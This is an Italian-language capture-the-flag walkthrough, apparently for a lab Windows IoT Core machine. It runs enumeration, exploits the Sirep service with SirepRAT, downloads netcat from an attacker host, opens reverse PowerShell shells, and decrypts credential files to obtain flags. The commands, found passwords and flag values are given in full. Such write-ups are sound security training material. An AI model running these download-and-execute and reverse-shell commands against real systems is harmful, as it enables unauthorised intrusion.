+	[V] Dependent program "polenum" found in /usr/bin/polenum
+	[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
+	Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Nov 25 14:08:53 2020
+
+	 ========================== 
+	|    Target Information    |
+	 ========================== 
+	Target ........... 10.10.10.204
+	RID Range ........ 500-550,1000-1050
+	Username ......... ''
+	Password ......... ''
+	Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+	 ==================================================== 
+	|    Enumerating Workgroup/Domain on 10.10.10.204    |
+	 ==================================================== 
+	[V] Attempting to get domain name with command: nmblookup -A '10.10.10.204'
+	[E] Can't find workgroup/domain
+
+
+	 ============================================ 
+	|    Nbtstat Information for 10.10.10.204    |
+	 ============================================ 
+	Looking up status of 10.10.10.204
+	No reply from 10.10.10.204
+
+	 ===================================== 
+	|    Session Check on 10.10.10.204    |
+	 ===================================== 
+	Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
+	[V] Attempting to make null session using command: smbclient -W '' //'10.10.10.204'/ipc$ -U''%'' -c 'help' 2>&1
+	[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
+
+
+---------------------------------------------------------------------------------------------------------------
+Provo ad enumerare anche con impacket
+	sudo git clone https://github.com/SecureAuthCorp/impacket.git
+	sudo pip3 install -r requirements.txt
+	rpcdump.py 10.10.10.204
+
+Ma niente...
+---------------------------------------------------------------------------------------------------------------
+Provo a cercare qualsiasi cosa possa essere un indizio. Nel dialog di login c'è scritto "Windows Device Portal".
+Faccio ricerche in merito. Risalgo a Windows 10 IoT core, che è affetto da una vulnerabilità Sirep/WpCon.
+Scopro che c'è un tool che può essere d'aiuto: SirepRAT
+---------------------------------------------------------------------------------------------------------------
+sudo git clone https://github.com/SafeBreach-Labs/SirepRAT.git
+Dopo aver perso un po' di tempo a causa di qualche problema con python, scopro che serve python2 (e pip2 di conseguenza)
+
+---------------------------------------------------------------------------------------------------------------
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://10.10.14.195:80/nc64.exe" --v
+
+alternativa:
+
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "powershell" --args '/c Invoke-WebRequest -Uri "http://10.10.14.195:80/nc64.exe" -OutFile "C:\Users\Public\nc64.exe"'
+---------------------------------------------------------------------------------------------------------------
+TEST
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c dir C: \\Windows\\System32\\spool\\drivers\\color" --v
+---------------------------------------------------------------------------------------------------------------
+Terminale 1: 
+nc -nlvp 1234
+
+Terminale 2:
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.195 1234 -e powershell.exe" --v
+
+Accesso ottenuto!
+---------------------------------------------------------------------------------------------------------------
+Enumerando infinitamente, trovo un file interessante al seguente path "C:\Program Files\WindowsPowershell\Modules\PackageManagement"
+
+ls -force -> r.bat
+cat r.bat
+
+Troviamo la seguente stringa, che sembra interessante
+	net user app mesh5143
+	net user administrator _1nt3rn37ofTh1nGz
+---------------------------------------------------------------------------------------------------------------
+Proviamo le credenziali al seguente link: http://10.10.10.204:8080/
+app:mesh5143 funziona, siamo dentro!
+Andiamo su process->run command-> C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.137 1235 -e powershell.exe
+Terminale 1: 
+nc -nlvp 1235
+---------------------------------------------------------------------------------------------------------------
+Nel nuovo terminale proviamo: $env:Username --> Siamo utente app.
+
+Cerchiamo la flag.  Eseguiamo qualche comando per capire un po' com'è l'ambiente. 
+net share -> Scopriamo che ci sono due unità disco C e U
+Get-Childitem –Path C:\ -Include "user.txt" -File -Recurse -> Non troviamo niente
+Get-Childitem –Path U:\ -Include "user.txt" -File -Recurse -> Troviamo la flag
+
+
+Leggiamo la flag "cat U:\Users\app\user.txt", ma la password è criptata. Nel file troviamo il seguente riferimento "System.Management.Automation.PSCredential".
+Cerco su google "System.Management.Automation.PSCredential decrypt" e al seguente link (https://www.travisgan.com/2015/06/powershell-password-encryption.html) trovo un comando che fa per noi.
+
+$credential = Import-CliXml -Path U:\Users\app\user.txt
+$credential.GetNetworkCredential().Password
+7cfd50f6bc34db3204898f1505ad9d70
+
+Flag corretta!
+---------------------------------------------------------------------------------------------------------------
+Proviamo le credenziali al seguente link: http://10.10.10.204:8080/
+administrator:_1nt3rn37ofTh1nGz funziona, siamo dentro!
+Andiamo su process->run command-> C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.137 1235 -e powershell.exe
+Terminale 1: 
+nc -nlvp 1235
+
+---------------------------------------------------------------------------------------------------------------
+Nel nuovo terminale proviamo: $env:Username --> Siamo utente app
+
+$credential = Import-CliXml -Path U:\Users\administrator\root.txt
+$credential.GetNetworkCredential().Password
+5dbdce5569e2c4708617c0ce6e9bf11d
